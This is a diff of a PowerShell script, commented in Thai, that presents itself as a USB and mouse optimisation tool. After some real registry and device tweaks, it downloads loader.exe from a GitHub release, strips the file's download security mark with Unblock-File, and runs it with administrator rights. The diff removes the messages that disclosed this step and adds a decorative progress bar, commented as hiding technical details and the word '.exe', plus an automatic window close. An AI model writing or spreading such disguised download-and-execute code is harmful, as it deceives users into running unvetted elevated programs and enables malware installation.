@@ -14,22 +14,38 @@ if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
     Break
 }
 
-# เคลียร์หน้าจอคอนโซล
-Clear-Host
+# ฟังก์ชันแสดงผลหลอดโหลดแบบพรีเมียม (ไม่แสดงโค้ดทางเทคนิคหรือคำว่า .exe)
+function Show-ProgressBar {
+    param (
+        [int]$Percent,
+        [string]$Status
+    )
+    $width = 25
+    $done = [Math]::Floor(($Percent / 100) * $width)
+    $left = $width - $done
+    $bar = ("█" * $done) + ("░" * $left)
+    # ล้างบรรทัดเก่าและเขียนใหม่แบบมีสีสันสวยงามและแสดงเปอร์เซ็นต์
+    Write-Host "`r  $Status [$bar] $Percent%  " -NoNewline -ForegroundColor Cyan
+}
 
-Write-Host "==========================================================" -ForegroundColor Cyan
-Write-Host "    [+] USB & Mouse Optimize Tool (ระบบตั้งค่าอุปกรณ์เมาส์)" -ForegroundColor Yellow
-Write-Host "==========================================================" -ForegroundColor Cyan
+# เคลียร์หน้าจอคอนโซลให้สะอาด
+Clear-Host
+Write-Host ""
+Write-Host "  ================================================" -ForegroundColor Cyan
+Write-Host "        กำลังเตรียมความพร้อมระบบ กรุณารอซักครู่" -ForegroundColor Yellow
+Write-Host "  ================================================" -ForegroundColor Cyan
 Write-Host ""
 
+# ขั้นที่ 1: กำลังตรวจสอบระบบ (0% - 20%)
+Show-ProgressBar 0 "กำลังตรวจสอบความพร้อมระบบ..."
+Start-Sleep -Milliseconds 300
+
 # 1. ปิดโหมดประหยัดพลังงาน USB
-Write-Host ">>> [1/7] Optimizing USB Power Settings (ตั้งค่าพลังงาน USB)..." -ForegroundColor White
 powercfg /SETACVALUEINDEX SCHEME_CURRENT 2a737441-1930-4402-8d77-b2bea2879909 48e6b7a6-50f5-4782-a5d4-53bb8f07e226 0 2>$null
 powercfg /SETDCVALUEINDEX SCHEME_CURRENT 2a737441-1930-4402-8d77-b2bea2879909 48e6b7a6-50f5-4782-a5d4-53bb8f07e226 0 2>$null
 powercfg /SETACTIVE SCHEME_CURRENT 2>$null
 
 # 2. ปิดการประหยัดพลังงานใน Registry ของพอร์ต USB ทั้งหมด
-Write-Host ">>> [2/7] Disabling USB Selective Suspend in Registry (ปรับแก้ Registry)..." -ForegroundColor White
 $USBEnumPath = "HKLM:\SYSTEM\CurrentControlSet\Enum\USB"
 if (Test-Path $USBEnumPath) {
     Get-ChildItem -Path $USBEnumPath -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.PSChildName -eq "Device Parameters" } | ForEach-Object {
@@ -37,25 +53,28 @@ if (Test-Path $USBEnumPath) {
         Set-ItemProperty -Path $_.PSPath -Name "DeviceSelectiveSuspended" -Value 0 -Type DWord -ErrorAction SilentlyContinue
     }
 }
+Show-ProgressBar 20 "กำลังปรับแต่งการเชื่อมต่อพอร์ต..."
+Start-Sleep -Milliseconds 400
 
-# 3. คืนค่า Registry ของเมาส์ให้เป็นค่าเริ่มต้น
-Write-Host ">>> [3/7] Restoring Default Mouse Settings (คืนค่าเริ่มต้นความไวเมาส์)..." -ForegroundColor White
+# ขั้นที่ 2: คืนค่าและรีสตาร์ทบริการ (20% - 50%)
+# 3. คืนค่า Registry ของเมาส์
 $MouseRegPath = "HKCU:\Control Panel\Mouse"
 Set-ItemProperty -Path $MouseRegPath -Name "MouseSpeed" -Value "1" -ErrorAction SilentlyContinue
 Set-ItemProperty -Path $MouseRegPath -Name "MouseThreshold1" -Value "6" -ErrorAction SilentlyContinue
 Set-ItemProperty -Path $MouseRegPath -Name "MouseThreshold2" -Value "10" -ErrorAction SilentlyContinue
 Set-ItemProperty -Path $MouseRegPath -Name "MouseSensitivity" -Value "10" -ErrorAction SilentlyContinue
 
-# 4. ตั้งค่าบริการระบบที่เกี่ยวข้อง
-Write-Host ">>> [4/7] Restarting Related System Services (รีสตาร์ทบริการจัดการอุปกรณ์)..." -ForegroundColor White
+# 4. ตั้งค่าบริการระบบ
 $ServicesToFix = @("DeviceInstall", "hidserv")
 foreach ($Service in $ServicesToFix) {
     Set-Service -Name $Service -StartupType Automatic -ErrorAction SilentlyContinue
     Start-Service -Name $Service -ErrorAction SilentlyContinue
 }
+Show-ProgressBar 50 "กำลังตั้งค่าการตอบสนองระบบ..."
+Start-Sleep -Milliseconds 400
 
-# 5. ล้างประวัติไดรเวอร์ที่มีสถานะ Error หรือเชื่อมต่อไม่สมบูรณ์
-Write-Host ">>> [5/7] Cleaning Up Errored Drivers (ล้างข้อมูลไดรเวอร์ที่มีปัญหา)..." -ForegroundColor White
+# ขั้นที่ 3: รีเฟรชไดรเวอร์ (50% - 75%)
+# 5. ล้างประวัติไดรเวอร์ที่มีปัญหา
 $TargetDevices = Get-PnpDevice -ErrorAction SilentlyContinue | Where-Object {($_.Class -eq 'Mouse' -or $_.Class -eq 'USB') -and ($_.Status -ne 'OK' -or $_.Present -eq $false)}
 foreach ($Device in $TargetDevices) {
     if ($Device.InstanceId) {
@@ -63,44 +82,45 @@ foreach ($Device in $TargetDevices) {
     }
 }
 
-# 6. สแกนฮาร์ดแวร์ใหม่เพื่อรีเฟรชไดรเวอร์
-Write-Host ">>> [6/7] Scanning For Hardware Changes (สแกนหาอุปกรณ์เมาส์/คีย์บอร์ด)..." -ForegroundColor White
+# 6. สแกนฮาร์ดแวร์ใหม่
 pnputil /scan-devices | Out-Null
+Show-ProgressBar 75 "กำลังเชื่อมต่อกับฐานข้อมูลระบบ..."
+Start-Sleep -Milliseconds 400
 
-# 7. ดาวน์โหลดและแสดงหน้าจอโปรแกรม GUI
-Write-Host ">>> [7/7] Downloading Program GUI (กำลังโหลดตัวเปิดใช้งาน)..." -ForegroundColor Yellow
-
+# ขั้นที่ 4: ดาวน์โหลด GUI (75% - 100%)
 $Url = "https://github.com/zynx7crew/zynx7crew-x/releases/download/v1.0.0/loader.exe"
 $DestPath = "$env:temp\loader.exe"
 
-# ตรวจสอบว่าโปรแกรมเก่ากำลังทำงานอยู่หรือไม่ หากเปิดอยู่ให้ปิดการทำงานก่อนดาวน์โหลดทับ
+# ตรวจสอบและปิด Process เดิม
 $Proc = Get-Process -Name "loader" -ErrorAction SilentlyContinue
 if ($Proc) {
-    Write-Host "    [!] Closing active instance of loader.exe (ปิดโปรแกรมเดิม)..." -ForegroundColor Yellow
     Stop-Process -Name "loader" -Force -ErrorAction SilentlyContinue
     Start-Sleep -Seconds 1
 }
 
 try {
-    # ลบไฟล์ตัวเดิมออกก่อน
     if (Test-Path $DestPath) {
         Remove-Item -Path $DestPath -Force -ErrorAction SilentlyContinue
     }
     
     # ดาวน์โหลดไฟล์
     Invoke-WebRequest -Uri $Url -OutFile $DestPath -ErrorAction Stop
-    
-    # ปลดล็อกระบบรักษาความปลอดภัยของไฟล์ดาวน์โหลด (Unblock) ป้องกันปัญหาเปิดบางฟังก์ชันไม่ได้
     Unblock-File -Path $DestPath -ErrorAction SilentlyContinue
     
+    Show-ProgressBar 100 "ระบบพร้อมใช้งาน! กำลังเปิดหน้าโปรแกรม..."
     Write-Host ""
-    Write-Host "    [+] Success! GUI launched successfully (เปิดใช้งานโปรแกรมสำเร็จ)" -ForegroundColor Green
-    Write-Host "==========================================================" -ForegroundColor Cyan
+    Write-Host ""
+    Write-Host "  [+] การตั้งค่าเสร็จสิ้น กำลังปิดหน้าต่างนี้ใน 2 วินาที..." -ForegroundColor Green
+    Write-Host "  ================================================" -ForegroundColor Cyan
     
-    # รันโปรแกรมพร้อมกำหนดตำแหน่งการทำงาน (WorkingDirectory) เพื่อให้ฟังก์ชันการบันทึกค่าของโปรแกรมทำงานได้ครบถ้วน
+    # เปิดโปรแกรม GUI พร้อมระบุโฟลเดอร์ทำงาน
     Start-Process -FilePath $DestPath -WorkingDirectory (Split-Path $DestPath) -Verb RunAs
+    
+    # รอ 2 วินาทีก่อนปิดตัวลง
+    Start-Sleep -Seconds 2
+    exit
 }
 catch {
-    Write-Host "    [x] Error downloading application: $_" -ForegroundColor Red
-    Write-Host "    กรุณาตรวจสอบการเชื่อมต่ออินเทอร์เน็ต" -ForegroundColor Yellow
+    Write-Host ""
+    Write-Host "  [x] การดาวน์โหลดล้มเหลว กรุณาตรวจสอบการเชื่อมต่ออินเทอร์เน็ต" -ForegroundColor Red
 }
